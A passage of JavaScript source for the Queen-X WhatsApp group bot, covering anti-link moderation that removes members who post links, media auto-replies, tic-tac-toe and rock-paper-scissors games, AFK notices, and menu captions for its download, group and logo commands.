XeonBotInc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

        //auto reply by xeon
  if (Autoreply)
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./XtroidGallery/sticker/${anji}.webp`)
					XeonBotInc.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  if (Autoreply)
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./XtroidGallery/audio/${anju}.mp3`)
					XeonBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  if (Autoreply)
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./XtroidGallery/image/${anjh}.jpg`)
					XeonBotInc.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  if (Autoreply) 
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./XtroidGallery/video/${anjh}.mp4`)
					XeonBotInc.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: XeonBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
XeonBotInc.ev.emit('messages.upsert', msg)
}

//guess song
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
        
        //TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    XeonBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    XeonBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Don't tag him!
He's in AFK ${reason ? 'with reason ' + reason : 'no reason'}
During ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
You stop AFK${user.afkReason ? ' after ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
        //menu image randomizer
	let picaks = [flaming,fluming,flarun,flasmurf]
	let picak = picaks[Math.floor(Math.random() * picaks.length)]
	
	//menu doc randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

//swtich case
        switch(command) {
case 'alive': {
    XeonBotInc.sendMessage(from, { react: { text: `📰`, key: m.key }})
    await XeonBotInc.sendMessage(m.chat, { audio: {url :"./XtroidGallery/audio/queen.mp3"  }, mimetype: 'audio/mp4', ptt: true, fileName: "Alive Audio.mp3" }, { quoted: m }) 
    let buttons = [    
    {buttonId: ` ping `, buttonText: {displayText: 'PING️'}, type: 1},
    {buttonId: ` runtime `, buttonText: {displayText: 'RUNTIME'}, type: 1},
    {buttonId: ` menu `, buttonText: {displayText: 'LIST MENU'}, type: 1}
    ]
    let buttonMessage = {
    image: { url: `https://telegra.ph/file/3f59bfc9d67c65e275b99.jpg` },
    caption: `🔖QＵＥＥＮ-Ｘ ＷＨＡＴＳＡＰＰ ＢＯＴ
*🔁Runtime: ${runtime(process.uptime())}*
_👽 Created by Queen-x owner Yuresh_

*Install Bot link▽*
_https://github.com/yureshofficial/Queen-x_

*Join My Watsapp Group▽*
_${linkz}_
   
*QUEEN -X USER BOT*`,
   
    footer: `${global.botname}`,
    buttons: buttons,
    headerType: 4,
    }
    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break    
 case 'menu': {
      XeonBotInc.sendMessage(from, { react: { text: `🗞️`, key: m.key }})
	const sections = [{
								"title": "SELECT ONE️",
								"rows": [
									{
										"title": "DOWNLOAD COMMANDS PANEL️",
										"rowId": `${prefix}allmenu`
									},
									{
										"title": "GROUP COMMANDS PANEL️",
										"rowId": `${prefix}groupmenu`
									},
									{
										"title": "LOGO COMMANDS PANEL️",
										"rowId": `${prefix}logomenu`
									}
								]
							}
						]
const listMessage = {
text: "```📂The full Menu will be provided in the next UPDATE.```",
  footer: `DATE : ${xdate}`,
  title: `\`\`\`QUEEN -X COMMANDS PANEL🗞️

ℹ ️OWNER ${ownername}
ℹ ️RUNTIME  ${runtime(process.uptime())}
ℹ ️DATE ${xdate}
\`\`\`\n`,
  buttonText: "SELECT MENU",
  sections
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, listMessage)
}
break
case 'allmenu':{
XeonBotInc.sendMessage(from, { react: { text: `⏬`, key: m.key }})
const buttons = [
  {buttonId: 'runtime', buttonText: {displayText: 'RUNTIME'}, type: 1},
  {buttonId: 'ping', buttonText: {displayText: 'PING'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'OWNER'}, type: 1}
]
const buttonMessage = {
    image: { url: `https://telegra.ph/file/3b403e1d0943bceda8133.jpg` },
    caption: `
    *QUEEN -X DOWNLOAD COMMANDS🧾*
    
*╭🔹OWNER*  ${ownername}
*│🔹RUNTIME*  ${runtime(process.uptime())}
*╰🔹DATE*  ${xdate}
            
🦹‍♀️‍ Command:- .video
🔖️ *Description:-* Downloading Videos With Youtube

🦹‍♀️‍️ Command:- .song
🔖️ *Description:-* Downloading Songs With Youtube

 🦹‍♀️ Command:- .img
🔖️ *Description:-* Download Images From Google (95+ results)

 🦹‍♀️ Command:- .modapk
🔖️ *Description:-* ModApk Download From Happy Mod
🌳 *Help:-* modapk inshot

 🦹‍♀️ Command:- .fb
🔖️ *Description:-* Download facebook videos

 🦹‍♀️ Command:- .gitclone
🔖️ *Description:-* Download Github Repos

 🦹‍♀️ Command:- .mediafire
🔖️ *Description:-* Download Content From Mediafire Link

 🦹‍♀️ Command:- .pdf
🔖️ *Description:-* Make New Pdf With Images

 🦹‍♀️ Command:- .tiktok
🔖️ *Description:-* Download Content From Tiktok Link

 🦹‍♀️ Command:- .movie
🔖️ *Description:-* Download Content From movie name

 🦹‍♀️ Command:- .ytd
🔖️ *Description:-* Downloading Videos With Youtube

 🦹‍♀️ Command:- .yts
🔖️ *Description:-* Search And Download Youtube Videos & Oudio

`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
			
			
case 'groupmenu':{
XeonBotInc.sendMessage(from, { react: { text: `⏬`, key: m.key }})
const buttons = [
  {buttonId: 'runtime', buttonText: {displayText: 'RUNTIME'}, type: 1},
  {buttonId: 'ping', buttonText: {displayText: 'PING'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'OWNER'}, type: 1}
]
const buttonMessage = {
    image: { url: `https://telegra.ph/file/3b403e1d0943bceda8133.jpg` },
    caption: `
    
    *QUEEN -X GROUP COMMANDS*🧾
    
*╭🔹OWNER*  ${ownername}
*│🔹RUNTIME*  ${runtime(process.uptime())}
*╰🔹DATE*  ${xdate}
      
‍🦹 Command:- .add
🧾️ *Description:-* Adds someone to the group.

‍🦹 Command:- .grouplink
🧾️ *Description:-* Group link sended

‍🦹 Command:- .antilink
🧾️ *Description:-* Group link remove

🦹 Command:- .antivirus
🧾️ *Description:-* Group link remove

‍🦹 Command:- .demote
🧾️ *Description:-* Takes the authority of any admin.

🦹‍♀️ Command:- .join
🧾 *Description:-* Provides the group's invitation link.

🦹‍♀️ Command:- .kick
🧾 *Description:-* Remove someone,all,common and difference members in the group
🔖 Help:- .kick all or .kick comm/second group jid or .kick diff/second group jid or reply a member  with .kick or mention

🦹‍♀️ Command:- .editinfo
🧾 *Description:-* lock the group. Only the admins can edit the group info

🦹‍♀️ Command:- .mute
🧾 *Description:-* Mute the group chat. Only the admins can send a message.

🦹‍♀️ Command:- .delete
🧾 *Description:-* delete tag.

🦹‍♀️ Command:- .setname
🧾 *Description:-* group name edit

🦹‍♀️ Command:- .promote
🧾 *Description:-* Makes any person an admin.

🦹‍♀️ Command:- .tagall
🧾 *Description:-* Group all tag.

🦹‍♀️ Command:- .hidetag
🧾 *Description:-*####

🦹‍♀️ Command:- .revoke
🧾 *Description:-* Revoke The Group Link

🦹‍♀️ Command:- .chat
🧾 *Description:-* Unlock the group. Anyone can edit the group info

🦹‍♀️ Command:- .chat
🧾 *Description:-* Unmute the group chat. Anyone can send a message.`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'logomenu':{
XeonBotInc.sendMessage(from, { react: { text: `⏬`, key: m.key }})
const buttons = [
  {buttonId: 'runtime', buttonText: {displayText: 'RUNTIME'}, type: 1},
  {buttonId: 'ping', buttonText: {displayText: 'PING'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'OWNER'}, type: 1}
]
const buttonMessage = {
    image: { url: `https://telegra.ph/file/3b403e1d0943bceda8133.jpg` },
    caption: `
    
    *QUEEN -X LOGO COMMANDS*🧾
    
*╭🔹OWNER*  ${ownername}
*│🔹RUNTIME*  ${runtime(process.uptime())}
*╰🔹DATE*  ${xdate}

🎨 . candy
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . blackpinkneon
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . deepsea
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . scifi
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . fiction
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . berry
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . fruitjuice
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . biscuit
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . wood
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . chocolate
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . matrix
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . blood
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . halloween
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . wicker
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . darkgold
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . firework
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . skeleton
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . sand
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . glue
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . leaves
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . magma
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . lava
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . rockart
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . bloodglas
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . underwater
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . textmaker
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . honey
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . ice
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . watercolor
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . multicolor
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . snow
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . harrypot
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . harrypotter
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . brokenglass
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . waterpipe
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . spooky
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . circuit
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . metallic
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . demon
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . sparklechristmas
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . christmas
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 3dchristmas
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . 3dbox
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . waterdrop
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . lion2
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . papercut
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . transformer
      🔁 𝚂𝚎𝚗𝚍 𝚕𝚘𝚐𝚘 𝚗𝚎𝚖𝚎 𝚊𝚗𝚍  𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎
🎨 . neondevil
